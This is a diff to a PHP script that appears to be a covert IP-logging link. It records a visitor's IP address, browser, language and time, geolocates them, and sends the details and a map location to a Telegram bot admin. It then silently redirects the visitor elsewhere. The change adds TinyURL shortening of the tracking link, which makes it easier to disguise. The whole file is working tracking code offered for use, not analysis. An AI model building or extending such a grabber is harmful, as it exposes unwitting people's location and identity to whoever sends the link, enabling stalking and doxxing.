@@ -23,12 +23,14 @@
 require('telegramapi.php');
 require('config.php');
 require('ipapi.php');
+require('tinyurlapi.php');
 
 $ip = $_SERVER['REMOTE_ADDR'];
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
 $accept=$_SERVER['HTTP_ACCEPT_LANGUAGE'];
 $today = date("l, F j, Y, g:i a") ;
 $script_url = $_SERVER['SCRIPT_URI'];
+$tinyurl = createTinyUrl($script_url);
 
 $message = "
 Ip: $ip
@@ -36,28 +38,29 @@ Browser: $userAgent
 Lingua: $accept
 Giorno & Ora : $today
 Url: $script_url
+TinyUrl: $tinyurl
 ";
 
 $res = get_ip_info($ip);
 
 if ($res !== null){
-    $message .= "\n<b>Info ip:</b>\n";
-    foreach($res as $key => $value){  
-        $message .= $key.": ".$value."\n";  
-    }
+	$message .= "\n<b>Info ip:</b>\n";
+	foreach($res as $key => $value){  
+		$message .= $key.": ".$value."\n";  
+	}
 }
 
 $first_message = sendMessage($bot_admin_id, $message);
 
 if ($res !== null){
-    sendLocation(
-        $bot_admin_id, 
-        (float)$res['lat'], 
-        (float)$res['lon'],
+	sendLocation(
+		$bot_admin_id, 
+		(float)$res['lat'], 
+		(float)$res['lon'],
         null,
         false,
         (int)$first_message['result']['message_id']
-    );
+	);
 }
 
 header("Location: $website_redirection");
